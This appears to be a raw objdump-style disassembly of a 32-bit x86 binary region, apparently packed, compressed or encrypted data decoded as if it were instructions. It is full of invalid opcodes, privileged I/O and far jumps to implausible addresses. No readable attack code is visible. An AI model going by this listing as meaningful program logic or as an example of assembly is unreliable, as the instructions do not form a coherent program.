  427536:	out    0xb3,al
  427538:	mov    eax,0x5dae2f6e
  42753d:	pop    edi
  42753e:	or     DWORD PTR [ecx-0x27],edx
  427541:	pushf  
  427542:	retf   
  427543:	sar    DWORD PTR ds:0xc5b765dd,cl
  427549:	repnz (bad) 
  42754b:	push   0xffffffcb
  42754d:	add    DWORD PTR [edi-0x71],edx
  427550:	mul    DWORD PTR [esi+0x15]
  427553:	das    
  427554:	lock sbb al,0x4a
  427557:	enter  0xf910,0xb4
  42755b:	sub    eax,DWORD PTR [edx+0x631d64d2]
  427561:	retf   
  427562:	xchg   ch,bl
  427564:	xor    DWORD PTR [ebx-0x1b],esi
  427567:	mov    bl,0x1d
  427569:	inc    edx
  42756a:	(bad)  
  42756b:	xchg   esp,eax
  42756c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  4275d5:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	inc    al
  4275e4:	mov    ds:0x1a598e1,eax
  4275e9:	add    bh,bh
  4275eb:	add    BYTE PTR [eax],al
  4275ed:	add    BYTE PTR [ecx+0x50],ah
  4275f0:	adc    al,0xe
  4275f2:	rcr    DWORD PTR [esi],cl
  4275f4:	push   esi
  4275f5:	pop    esp
  4275f6:	pop    edx
  4275f7:	rol    BYTE PTR cs:[esi-0x51],cl
  4275fb:	adc    DWORD PTR [ebp+0x38f411c4],edi
  427601:	push   ecx
  427602:	jg     0x4275f1
  427604:	leave  
  427605:	jae    0x42763f
  427607:	adc    bh,BYTE PTR [edi+0x57fa52cd]
  42760d:	rcl    DWORD PTR [ebx+edx*1+0x75],0x7c
  427612:	mov    ecx,0xcd94d50d
  427617:	mov    esi,0xb42608ef
  42761c:	dec    ebx
  42761d:	pop    ebp
  42761e:	pop    ecx
  42761f:	aaa    
  427620:	jbe    0x42769d
  427622:	push   esp
  427623:	dec    edi
  427624:	mov    eax,0x275495a6
  427629:	imul   ebp,edi,0xe60c5e7c
  42762f:	cwde   
  427630:	(bad)  
  427631:	data16 adc ah,BYTE PTR [eax+0x1b]
  427635:	outs   dx,BYTE PTR ds:[esi]
  427636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427637:	pop    ebp
  427638:	jge    0x4275cf
  42763a:	inc    edi
  42763b:	stos   BYTE PTR es:[edi],al
  42763c:	dec    edi
  42763d:	or     al,0xa0
  42763f:	sub    cl,BYTE PTR [ecx-0x49]
  427642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427643:	dec    edx
  427644:	js     0x427694
  427646:	je     0x42760b
  427648:	xchg   ebx,eax
  427649:	scas   eax,DWORD PTR es:[edi]
  42764a:	ins    DWORD PTR es:[edi],dx
  42764b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42764c:	pushf  
  42764d:	inc    edi
  42764e:	mov    cl,0xf
  427650:	leave  
  427651:	jmp    0x4276c3
  427653:	fwait
  427654:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  427656:	pop    edx
  427657:	mov    ecx,0x13a7089e
  42765c:	(bad)  
  42765d:	pop    edi
  42765e:	or     DWORD PTR [eax-0x3d81f9be],ecx
  427664:	mov    ecx,0xd50bbaf3
  427669:	jnp    0x427675
  42766b:	pop    edi
  42766c:	push   edx
  42766d:	dec    eax
  42766e:	mov    WORD PTR [eax+esi*2+0x569162d4],ss
  427675:	push   edi
  427676:	jmp    0x4276c5
  427678:	jp     0x42763d
  42767a:	mov    cl,0x65
  42767c:	mov    esi,0xfcf3c17d
  427681:	push   cs
  427682:	push   ds
  427683:	sar    ch,0x9f
  427686:	cdq    
  427687:	jnp    0x427666
  427689:	fisubr WORD PTR [edi+0x41]
  42768c:	test   al,0x3d
  42768e:	les    esi,FWORD PTR ds:0x6a8f61a0
  427694:	nop
  427695:	arpl   WORD PTR [ebx],di
  427697:	xor    DWORD PTR [edx-0x6cec0890],esi
  42769d:	fbld   TBYTE PTR [ebx+0x284d9b17]
  4276a3:	adc    edi,DWORD PTR [esi-0x1bb547eb]
  4276a9:	repnz sbb eax,0xb9f8e28a
  4276af:	sbb    cl,BYTE PTR [edi]
  4276b1:	push   esp
  4276b2:	je     0x427717
  4276b4:	retf   
  4276b5:	fcmovbe st,st(7)
  4276b7:	std    
  4276b8:	ret    0x32fd
  4276bb:	mov    al,ds:0x13a25897
  4276c0:	test   DWORD PTR [ebp-0x22],0xad5498ae
  4276c7:	cs mov bl,0xd2
  4276ca:	gs dec eax
  4276cc:	ss add esi,esp
  4276cf:	mov    ds:0x6d1a663f,eax
  4276d4:	sahf   
  4276d5:	ret    0xb5b3
  4276d8:	int3   
  4276d9:	out    dx,eax
  4276da:	cmp    ebx,esp
  4276dc:	xlat   BYTE PTR ds:[ebx]
  4276dd:	mov    ecx,0x70419386
  4276e2:	lods   al,BYTE PTR ds:[esi]
  4276e3:	mov    eax,ds:0xcf87c792
  4276e8:	push   ecx
  4276e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276ea:	inc    eax
  4276eb:	aas    
  4276ec:	cmp    al,BYTE PTR [eax]
	...
  427756:	add    DWORD PTR [esi-0x70],edx
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fnstcw WORD PTR [ecx]
  427763:	aad    0xe2
  427765:	stc    
  427766:	xchg   edi,eax
  427767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427768:	add    DWORD PTR [eax],eax
  42776a:	inc    DWORD PTR [eax]
  42776c:	add    BYTE PTR [eax],al
  42776e:	push   0x6f63138d
  427773:	fwait
  427774:	xor    al,0x2e
  427776:	cmp    BYTE PTR [esp+edi*8],al
  427779:	and    BYTE PTR [ecx],bh
  42777b:	dec    edx
  42777c:	push   edx
  42777d:	lock pushf 
  42777f:	call   0xa533:0x5ba49c94
  427786:	xchg   edx,eax
  427787:	cmp    eax,0x86a1f9b3
  42778c:	sbb    al,0x38
  42778e:	or     eax,0x7e9de117
  427793:	jecxz  0x4277fb
  427795:	xchg   ecx,eax
  427796:	scas   eax,DWORD PTR es:[edi]
  427797:	test   DWORD PTR [edi-0x1c311887],ebx
  42779d:	xor    al,0x48
  42779f:	xchg   ebx,eax
  4277a0:	popf   
  4277a1:	sbb    eax,0x648cf21c
  4277a6:	ds scas al,BYTE PTR es:[edi]
  4277a8:	inc    esi
  4277a9:	rcr    BYTE PTR [ebx+0x4a2152e5],cl
  4277af:	fsub   QWORD PTR [edi+0x52]
  4277b2:	push   eax
  4277b3:	push   0x20bec960
  4277b8:	pop    es
  4277b9:	bound  edi,QWORD PTR [esi+0x1b]
  4277bc:	in     eax,0x2c
  4277be:	addr16 mov edx,0xb46e6d33
  4277c4:	pop    es
  4277c5:	xchg   DWORD PTR [edi+0x6e],edx
  4277c8:	jmp    0x427751
  4277ca:	mov    BYTE PTR [ebx+0x53859ea7],bl
  4277d0:	sbb    ah,BYTE PTR [ecx+0x4c8f00fa]
  4277d6:	sbb    bl,BYTE PTR [edx+0x23]
  4277d9:	pop    ebp
  4277da:	je     0x42778b
  4277dc:	mov    BYTE PTR [edx+edx*8-0x49],al
  4277e0:	inc    eax
  4277e1:	lahf   
  4277e2:	sub    ah,BYTE PTR [edi+0x30]
  4277e5:	push   0xffffffe1
  4277e7:	or     edx,ebx
  4277e9:	sbb    ah,bl
  4277eb:	xchg   di,ax
  4277ed:	dec    DWORD PTR [edx-0x1d]
  4277f0:	sar    BYTE PTR [edx-0x686adc09],1
  4277f6:	lahf   
  4277f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277f8:	stc    
  4277f9:	push   0x46867ae3
  4277fe:	test   bl,cl
  427800:	out    0xcb,eax
  427802:	jae    0x427881
  427804:	es (bad) 
  427806:	in     eax,0x96
  427808:	scas   eax,DWORD PTR es:[edi]
  427809:	dec    esp
  42780a:	push   eax
  42780b:	popa   
  42780c:	xor    ecx,eax
  42780e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42780f:	adc    dh,BYTE PTR [esi+0x11]
  427812:	xchg   BYTE PTR [edi-0x2d],bh
  427815:	test   BYTE PTR [esi+0x3e9a1292],dh
  42781b:	adc    edx,DWORD PTR [eax+edx*4-0x85886ec]
  427822:	jg     0x4277fc
  427824:	mul    BYTE PTR [edx]
  427826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427827:	ficomp DWORD PTR [ebx+0x44ec10a8]
  42782d:	mov    ?,WORD PTR [esi-0xb70112b]
  427833:	or     al,0xb6
  427835:	lahf   
  427836:	mov    esp,0x467614de
  42783b:	aas    
  42783c:	scas   eax,DWORD PTR es:[edi]
  42783d:	sbb    ebx,DWORD PTR [ebp+0x7c]
  427840:	or     DWORD PTR [ebx-0x4],esp
  427843:	add    al,0xc2
  427845:	enter  0x15a2,0x2e
  427849:	fild   DWORD PTR [ebx]
  42784b:	or     al,0xbf
  42784d:	mov    bl,0xaf
  42784f:	lock test bh,bh
  427852:	pop    esi
  427853:	mov    edx,0xe9e60d3e
  427858:	push   esp
  427859:	add    eax,DWORD PTR [ecx-0x63]
  42785c:	mov    eax,ds:0xc7ce78cb
  427861:	cmp    eax,0xf2739197
  427866:	daa    
  427867:	jl     0x42788e
  427869:	mov    ah,0x2c
  42786b:	imul   ebx,DWORD PTR [ecx],0x0
	...
  4278d6:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4278dc:	pop    esi
  4278dd:	fbstp  TBYTE PTR [eax+0x65]
  4278e0:	fldl2e 
  4278e2:	jmp    0x1a7:0x96a66232
  4278e9:	add    bh,bh
  4278eb:	add    BYTE PTR [eax],al
  4278ed:	add    BYTE PTR [eax],dh
  4278ef:	out    0xea,al
  4278f1:	call   0x2e281010
  4278f6:	sub    eax,0x3905531d
  4278fb:	pop    esi
  4278fc:	outs   dx,BYTE PTR ds:[esi]
  4278fd:	pop    eax
  4278fe:	dec    ecx
  4278ff:	rol    BYTE PTR [ecx+ebp*4+0x37c662ac],0xde
  427907:	scas   eax,DWORD PTR es:[edi]
  427908:	push   ds
  427909:	mov    dl,dh
  42790b:	aaa    
  42790c:	xor    eax,0x3703ccdb
  427911:	(bad)  
  427912:	das    
  427913:	ret    
  427914:	push   ss
  427915:	add    eax,0xb234e84c
  42791a:	stos   BYTE PTR es:[edi],al
  42791b:	test   DWORD PTR [ebx-0x762463fc],ebp
  427921:	xchg   ebx,ebx
  427923:	push   ds
  427924:	pop    esi
  427925:	test   DWORD PTR [ebx+edi*4],eax
  427928:	xchg   esi,eax
  427929:	sub    eax,0x3df6b6ff
  42792e:	ret    
  42792f:	mov    ecx,0x498583f4
  427934:	and    al,0xc8
  427936:	jmp    0x427992
  427938:	pop    ecx
  427939:	push   es
  42793a:	into   
  42793b:	mov    ch,0xca
  42793d:	fdivr  QWORD PTR [esp+esi*1+0x2330defb]
  427944:	xchg   esp,esi
  427946:	loopne 0x4279b4
  427948:	xchg   ebp,eax
  427949:	cs and al,0xc1
  42794c:	jbe    0x4279a5
  42794e:	or     eax,0xec5745e5
  427953:	and    al,BYTE PTR [eax]
  427955:	add    edx,DWORD PTR [ebp+0x3e8c9f7c]
  42795b:	push   esp
  42795c:	fwait
  42795d:	out    0xab,al
  42795f:	data16 (bad) [edx]
  427962:	popf   
  427963:	clc    
  427964:	aas    
  427965:	arpl   WORD PTR [esi],cx
  427967:	adc    al,0x5
  427969:	cmp    esp,edi
  42796b:	push   ss
  42796c:	inc    edi
  42796d:	out    dx,eax
  42796e:	leave  
  42796f:	add    esi,DWORD PTR [edx]
  427971:	lods   al,BYTE PTR ds:[esi]
  427972:	cdq    
  427973:	pop    ebp
  427974:	mov    dl,ah
  427976:	cmp    ecx,esi
  427978:	xchg   BYTE PTR [eax+0x79],ch
  42797b:	push   ebp
  42797c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42797d:	fs jnp 0x427976
  427980:	out    dx,al
  427981:	push   0x36286d15
  427986:	add    ch,BYTE PTR [edi+0x38e18642]
  42798c:	pop    ebx
  42798d:	(bad)  
  42798e:	ins    DWORD PTR es:[edi],dx
  42798f:	mov    esp,0x4ad1454f
  427994:	div    ecx
  427996:	cmp    cl,BYTE PTR [esi-0x3d01ef2c]
  42799c:	fwait
  42799d:	sbb    BYTE PTR [ecx+0x4],dh
  4279a0:	loop   0x4279b1
  4279a2:	pop    esp
  4279a3:	and    al,0x4a
  4279a5:	jle    0x427a1b
  4279a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279a8:	dec    ebx
  4279a9:	push   cs
  4279aa:	or     ebp,ecx
  4279ac:	clc    
  4279ad:	out    dx,eax
  4279ae:	sub    DWORD PTR [ebp+0x305fbcc7],ecx
  4279b4:	cmp    al,0xa2
  4279b6:	mov    esp,DWORD PTR [esi]
  4279b8:	mov    ebx,0xc74a3d0e
  4279bd:	call   0x24efc31e
  4279c2:	es call 0xb753:0x2c94ec7
  4279ca:	std    
  4279cb:	mov    esi,0xa0181ddc
  4279d1:	pop    ds
  4279d2:	in     al,dx
  4279d3:	lods   al,BYTE PTR ds:[esi]
  4279d4:	add    bh,ah
  4279d6:	(bad)  
  4279d7:	test   al,0x6c
  4279d9:	pushf  
  4279da:	int    0x9c
  4279dc:	inc    esi
  4279dd:	xchg   BYTE PTR [edx+0x3f],dh
  4279e0:	mov    DWORD PTR [edi+eiz*1+0x1125e099],ecx
  4279e7:	xchg   ecx,eax
  4279e8:	push   ss
  4279e9:	and    bh,BYTE PTR [ebx]
  4279eb:	xor    eax,DWORD PTR [ebx]
	...
  427a55:	add    BYTE PTR [edx-0x5c0023],bl
  427a5b:	mov    ds:0x7542fdde,eax
  427a60:	fadd   DWORD PTR [ebx+0x7d3bc022]
  427a66:	xchg   ebp,eax
  427a67:	test   al,0x1
  427a69:	add    bh,bh
  427a6b:	add    BYTE PTR [eax],al
  427a6d:	add    BYTE PTR [ecx-0x4],dl
  427a70:	int3   
  427a71:	cli    
  427a72:	jnp    0x427a76
  427a74:	pushf  
  427a75:	clc    
  427a76:	ds dec eax
  427a78:	pop    edi
  427a79:	dec    ebp
  427a7a:	jge    0x427a4b
  427a7c:	aaa    
  427a7d:	scas   al,BYTE PTR es:[edi]
  427a7e:	mov    BYTE PTR [edi-0x596ab873],al
  427a84:	cmc    
  427a85:	push   ds
  427a86:	mov    ebp,0xe2e6ee9d
  427a8b:	cmc    
  427a8c:	fsub   QWORD PTR [ebx]
  427a8e:	pop    ds
  427a8f:	pop    ss
  427a90:	xor    al,0xd
  427a92:	xchg   DWORD PTR [edx+0x79723abb],edi
  427a98:	jg     0x427a67
  427a9a:	outs   dx,BYTE PTR ds:[esi]
  427a9b:	dec    eax
  427a9c:	outs   dx,DWORD PTR ds:[esi]
  427a9d:	jnp    0x427b11
  427a9f:	scas   al,BYTE PTR es:[edi]
  427aa0:	mov    WORD PTR [ecx],ss
  427aa2:	aad    0xb9
  427aa4:	cmp    BYTE PTR [eax+0x5f],dh
  427aa7:	pop    esi
  427aa8:	cli    
  427aa9:	lea    esi,[esi-0x11]
  427aac:	push   edx
  427aad:	dec    esp
  427aae:	xchg   esi,eax
  427aaf:	push   0x435e08e0
  427ab4:	adc    ecx,DWORD PTR [edx+0xd8e170b]
  427aba:	pop    ebp
  427abb:	(bad)  
  427abc:	(bad)  
  427abd:	icebp  
  427abe:	add    eax,ecx
  427ac0:	push   esp
  427ac1:	rcl    al,0x53
  427ac4:	lds    edi,FWORD PTR [ebp-0x3a]
  427ac7:	adc    DWORD PTR [esi-0x21],esp
  427aca:	neg    dl
  427acc:	test   eax,0xef89c450
  427ad1:	adc    al,0x39
  427ad3:	ficom  WORD PTR [edx-0x473ccbaa]
  427ad9:	test   BYTE PTR [edi],ah
  427adb:	ficom  WORD PTR [edi]
  427add:	out    0x82,eax
  427adf:	inc    ebx
  427ae0:	jb     0x427a8f
  427ae2:	adc    DWORD PTR [ecx+0x36e279f9],esp
  427ae8:	xlat   BYTE PTR ds:[ebx]
  427ae9:	xlat   BYTE PTR ds:[ebx]
  427aea:	push   edi
  427aeb:	push   ecx
  427aec:	cld    
  427aed:	test   bl,ch
  427aef:	scas   al,BYTE PTR es:[edi]
  427af0:	les    esp,FWORD PTR [ecx+0x7ee0070c]
  427af6:	std    
  427af7:	or     DWORD PTR [ebx+0x4e9fb61c],esp
  427afd:	mov    bh,0xa1
  427aff:	xor    ch,BYTE PTR [edx-0x75]
  427b02:	mov    ds:0x27519e3,eax
  427b07:	sahf   
  427b08:	push   0x37
  427b0a:	fidivr WORD PTR [ecx+0x76]
  427b0d:	xor    al,0xc2
  427b0f:	call   0xd8cee07a
  427b14:	psadbw mm7,mm3
  427b17:	jno    0x427b68
  427b19:	xor    BYTE PTR [edx],ah
  427b1b:	bound  esp,QWORD PTR [ecx-0xc43a527]
  427b21:	sub    al,BYTE PTR [ebx-0xa]
  427b24:	pop    es
  427b25:	test   ebx,eax
  427b27:	in     al,0xc4
  427b29:	test   BYTE PTR [ebx+0x77c87a39],dl
  427b2f:	fst    DWORD PTR [ebp-0x50]
  427b32:	xchg   esp,eax
  427b33:	mov    edi,0x9ca6061a
  427b38:	ins    BYTE PTR es:[edi],dx
  427b39:	fidivr WORD PTR [esi+edi*4]
  427b3c:	test   al,0xdb
  427b3e:	jb     0x427afc
  427b40:	rol    BYTE PTR [ebx-0x270bf33c],0xb
  427b47:	enter  0x3bb0,0xaf
  427b4b:	(bad)  
  427b4c:	out    dx,eax
  427b4d:	lds    eax,FWORD PTR [eax+0x19]
  427b50:	je     0x427bc4
  427b52:	cmp    eax,0x39a1efd9
  427b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b58:	(bad)  
  427b59:	sbb    ecx,DWORD PTR fs:[ecx+edi*4-0x3f30d99b]
  427b61:	push   ebp
  427b62:	jp     0x427af4
  427b64:	sub    cl,BYTE PTR [esi+0x47]
  427b67:	xchg   esp,eax
  427b68:	cmp    eax,0x16c3617b
	...
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	div    BYTE PTR [edx]
  427be3:	arpl   WORD PTR [esi+0x1a9945c],bx
  427be9:	add    bh,bh
  427beb:	add    BYTE PTR [eax],al
  427bed:	add    BYTE PTR [esi-0x1a],bl
  427bf0:	icebp  
  427bf1:	fdiv   DWORD PTR [esp+edi*2+0x23c48399]
  427bf8:	pop    esp
  427bf9:	(bad)  
  427bfa:	test   eax,0x66c635b7
  427bff:	addr16 mov cl,0xcc
  427c02:	sub    DWORD PTR [edi-0x42393dd6],edi
  427c08:	dec    eax
  427c09:	xor    al,0x84
  427c0b:	jno    0x427bb5
  427c0d:	lock inc esp
  427c0f:	imul   ebp,DWORD PTR [eax],0xffffff82
  427c12:	ret    
  427c13:	pop    ebp
  427c14:	ins    BYTE PTR es:[edi],dx
  427c15:	or     cl,BYTE PTR [ebx]
  427c17:	aad    0xc4
  427c19:	gs sub eax,0x800d38ec
  427c1f:	mov    ebp,0xb0d01d3c
  427c24:	mov    cl,0x97
  427c26:	in     al,0xf3
  427c28:	data16 scas al,BYTE PTR es:[edi]
  427c2a:	das    
  427c2b:	or     DWORD PTR [eax],edi
  427c2d:	fs daa 
  427c2f:	jmp    0x2cf893bf
  427c34:	jmp    0x605d:0xe139d54b
  427c3b:	cld    
  427c3c:	aaa    
  427c3d:	test   al,0x78
  427c3f:	in     al,0xf8
  427c41:	les    ebx,FWORD PTR [eax]
  427c43:	sbb    BYTE PTR [ecx-0x66],bh
  427c46:	jecxz  0x427c37
  427c48:	jmp    0x83f1:0xf34eb020
  427c4f:	and    BYTE PTR [esi-0x67],bl
  427c52:	cmc    
  427c53:	outs   dx,DWORD PTR ds:[esi]
  427c54:	shr    BYTE PTR [edx-0x789591ab],cl
  427c5a:	xlat   BYTE PTR ds:[ebx]
  427c5b:	imul   eax,DWORD PTR [ebx-0x2ed03d89],0xcedb836b
  427c65:	mov    ebx,0x864809fd
  427c6a:	pop    ebx
  427c6b:	xor    ah,dh
  427c6d:	(bad)  
  427c6e:	mov    ds:0x60171dd3,al
  427c73:	(bad)  
  427c74:	ins    DWORD PTR es:[edi],dx
  427c75:	pop    ds
  427c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c77:	loop   0x427c72
  427c79:	cmc    
  427c7a:	jno    0x427cf5
  427c7c:	cmp    esp,DWORD PTR [ebp-0x3ae093f4]
  427c82:	fsubr  DWORD PTR [esi-0x5]
  427c85:	fldenv [eax+edi*2-0x52f994a0]
  427c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c8d:	out    dx,al
  427c8e:	mov    eax,ds:0x6438c730
  427c93:	adc    eax,0xceec8f1e
  427c98:	add    esp,edx
  427c9a:	mov    ch,0x8c
  427c9c:	out    dx,eax
  427c9d:	lods   eax,DWORD PTR ds:[esi]
  427c9e:	shl    DWORD PTR es:[ebp-0x79],cl
  427ca2:	mov    ch,0xe1
  427ca4:	push   cs
  427ca5:	xor    esi,DWORD PTR [ecx+ebp*2+0x76]
  427ca9:	nop
  427caa:	shl    DWORD PTR [eax-0x332522c0],0x28
  427cb1:	outs   dx,BYTE PTR ds:[esi]
  427cb2:	sti    
  427cb3:	fcomp  st(7)
  427cb5:	add    al,0x2b
  427cb7:	icebp  
  427cb8:	lods   eax,DWORD PTR ds:[esi]
  427cb9:	call   0x29f55d11
  427cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427cbf:	mov    ds:0x7e11ed19,eax
  427cc4:	jecxz  0x427d12
  427cc6:	add    esi,DWORD PTR [ebp+0x3c]
  427cc9:	fdiv   QWORD PTR [ebx]
  427ccb:	jmp    0xfdf6fe79
  427cd0:	hlt    
  427cd1:	dec    ebx
  427cd2:	jp     0x427c8a
  427cd4:	loopne 0x427cc7
  427cd6:	bound  edx,QWORD PTR [edi+eiz*1+0x4e]
  427cda:	dec    esi
  427cdb:	add    ecx,DWORD PTR [eax+0x36618cea]
  427ce1:	dec    ebp
  427ce2:	jecxz  0x427cbc
  427ce4:	sub    BYTE PTR [esi],al
  427ce6:	inc    esi
  427ce7:	sub    al,0x12
  427ce9:	push   ds
  427cea:	mov    dh,0x93
  427cec:	fld    QWORD PTR [eax]
	...
  427d56:	mov    ds:0xf343b050,eax
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0x1fc55d44,ebx
  427d64:	pop    ebx
  427d65:	cmp    DWORD PTR [ebx-0xfffe56],edx
  427d6b:	add    BYTE PTR [eax],al
  427d6d:	add    BYTE PTR [edx+ebp*1],bh
  427d70:	sub    dl,dh
  427d72:	leave  
  427d73:	pop    es
  427d74:	repnz mov cl,0x3d
  427d77:	pop    ss
  427d78:	dec    edi
  427d79:	pop    edx
  427d7a:	cld    
  427d7b:	xor    bh,cl
  427d7d:	inc    eax
  427d7e:	xchg   DWORD PTR [ebp+edx*1+0x58],esp
  427d82:	add    eax,0xaf9dcfab
  427d87:	xor    ch,cl
  427d89:	dec    eax
  427d8a:	loop   0x427d24
  427d8c:	leave  
  427d8d:	clc    
  427d8e:	add    dl,BYTE PTR [edi-0x20]
  427d91:	std    
  427d92:	and    edx,DWORD PTR ds:0x553bf8d6
  427d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d99:	cmp    BYTE PTR [esi+ebp*8+0x985d9e5],ch
  427da0:	std    
  427da1:	icebp  
  427da2:	ja     0x427d66
  427da4:	cli    
  427da5:	inc    eax
  427da6:	bound  ebp,QWORD PTR [ecx+0x6bec8d59]
  427dac:	or     BYTE PTR [ecx+0x23],ah
  427daf:	xchg   DWORD PTR [eax],esi
  427db1:	adc    eax,0x18b3c9d9
  427db6:	mov    eax,0x985ff8d2
  427dbb:	sbb    al,0x86
  427dbd:	out    0xcf,al
  427dbf:	dec    ecx
  427dc0:	fst    st(7)
  427dc2:	rcl    bh,0x28
  427dc5:	and    DWORD PTR [eax-0x42eb1171],esi
  427dcb:	xchg   edi,eax
  427dcc:	inc    esi
  427dcd:	mov    edi,0x32632e02
  427dd2:	test   al,0xc0
  427dd4:	cmp    ch,BYTE PTR [esi-0x62]
  427dd7:	mov    WORD PTR [edi-0x40f7f11c],ss
  427ddd:	fisub  WORD PTR [ebx]
  427ddf:	hlt    
  427de0:	xchg   BYTE PTR [ecx+0x1d9b4898],ah
  427de6:	inc    ebp
  427de7:	into   
  427de8:	lock inc ebx
  427dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427deb:	lea    eax,[ebx+0x4740fc05]
  427df1:	ficomp WORD PTR [esi+0x6d]
  427df4:	sub    bh,BYTE PTR [ebx]
  427df6:	popa   
  427df7:	jmp    0xef85:0xcb8429da
  427dfe:	mov    ds:0xd65b545a,al
  427e03:	pop    ss
  427e04:	adc    DWORD PTR [ecx-0x68],esp
  427e07:	rcr    DWORD PTR [edx-0x4c34d8c7],cl
  427e0d:	push   cs
  427e0e:	retf   0x20cc
  427e11:	popf   
  427e12:	mov    ch,0x6f
  427e14:	mov    dh,0x59
  427e16:	inc    ebx
  427e17:	outs   dx,BYTE PTR ds:[esi]
  427e18:	push   ebx
  427e19:	test   BYTE PTR [ecx+esi*8],bl
  427e1c:	inc    eax
  427e1d:	call   0x1243:0x956590b4
  427e24:	aaa    
  427e25:	add    al,0xa
  427e27:	sbb    eax,0x3bd84e7f
  427e2c:	sbb    al,0x69
  427e2e:	jo     0x427e7e
  427e30:	mov    cl,0x94
  427e32:	gs addr16 cwde 
  427e35:	dec    ebp
  427e36:	neg    DWORD PTR [esi]
  427e38:	sahf   
  427e39:	aad    0x65
  427e3b:	mov    gs,ebx
  427e3d:	and    al,0x2c
  427e3f:	stos   DWORD PTR es:[edi],eax
  427e40:	sub    DWORD PTR [ebp+0x7e],edx
  427e43:	dec    esi
  427e44:	sti    
  427e45:	cld    
  427e46:	mov    ecx,0x5628b0d6
  427e4b:	or     BYTE PTR [edi+ebx*4],ah
  427e4e:	dec    ebx
  427e4f:	ret    
  427e50:	adc    cl,BYTE PTR [ebp+eiz*4+0xbcde97]
  427e57:	int3   
  427e58:	repnz push edi
  427e5a:	jno    0x427e70
  427e5c:	adc    BYTE PTR [edi+0x35],dl
  427e5f:	push   eax
  427e60:	pop    esp
  427e61:	rcl    dh,0x29
  427e64:	es popf 
  427e66:	ins    BYTE PTR es:[edi],dx
  427e67:	test   eax,0x27d39e9e
  427e6c:	adc    eax,DWORD PTR [eax]
	...
  427ed6:	mov    eax,0x6d3c25f1
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	arpl   WORD PTR [edi],bp
  427ee4:	mov    WORD PTR [ebx],fs
  427ee6:	xchg   edx,eax
  427ee7:	stos   DWORD PTR es:[edi],eax
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	inc    DWORD PTR [eax]
  427eec:	add    BYTE PTR [eax],al
  427eee:	outs   dx,DWORD PTR ds:[esi]
  427eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ef0:	and    bl,BYTE PTR [ecx]
  427ef2:	jbe    0x427ec9
  427ef4:	pusha  
  427ef5:	and    ebx,DWORD PTR [edx+0x75]
  427ef8:	call   0xd239a55
  427efd:	test   DWORD PTR [esi-0x2b],0x2de36b33
  427f04:	ror    dh,0x38
  427f07:	in     eax,0xef
  427f09:	sub    al,0x83
  427f0b:	lock mov bh,0x2d
  427f0e:	aam    0x82
  427f10:	mov    dl,0x83
  427f12:	dec    edi
  427f13:	jne    0x427f14
  427f15:	mov    bl,0x11
  427f17:	out    0x2,al
  427f19:	cmc    
  427f1a:	jl     0x427f12
  427f1c:	(bad)  
  427f1d:	xchg   edx,eax
  427f1e:	adc    eax,0xfdb6b465
  427f23:	inc    esi
  427f24:	add    esp,DWORD PTR [eax-0x1f9a191b]
  427f2a:	dec    edx
  427f2b:	xor    BYTE PTR [ecx+0xaaf9e4d],al
  427f31:	mov    ebp,0x3b4e6088
  427f36:	add    bl,BYTE PTR [ebx+0x65]
  427f39:	das    
  427f3a:	(bad)  [ebp+eiz*2-0x6b36463c]
  427f41:	int    0x5a
  427f43:	lea    eax,[eax+0x15]
  427f46:	mov    esi,0xe9ed87b3
  427f4b:	xchg   ebx,eax
  427f4c:	adc    BYTE PTR [edx+0x3d6566c2],bh
  427f52:	jnp    0x427fb5
  427f54:	push   0xffffffdb
  427f56:	dec    esp
  427f57:	mov    esp,0xecc938d3
  427f5c:	jbe    0x427f02
  427f5e:	es jg  0x427fca
  427f61:	fld    QWORD PTR cs:[esi+0x72a68023]
  427f68:	ror    DWORD PTR [esi+0x6f],cl
  427f6b:	in     al,0x26
  427f6d:	dec    edx
  427f6e:	sub    eax,0x3d04f92a
  427f73:	out    0xda,eax
  427f75:	push   edi
  427f76:	loope  0x427f91
  427f78:	(bad)  
  427f79:	in     al,dx
  427f7a:	mov    esi,0xdff9d81f
  427f7f:	xor    DWORD PTR [ecx+edx*1],ebp
  427f82:	cdq    
  427f83:	sub    al,0xf4
  427f85:	jbe    0x427fb7
  427f87:	sar    BYTE PTR [edi-0x20],0x70
  427f8b:	jae    0x427f8c
  427f8d:	jl     0x427f49
  427f8f:	aad    0xd1
  427f91:	fmul   QWORD PTR [eax-0x27]
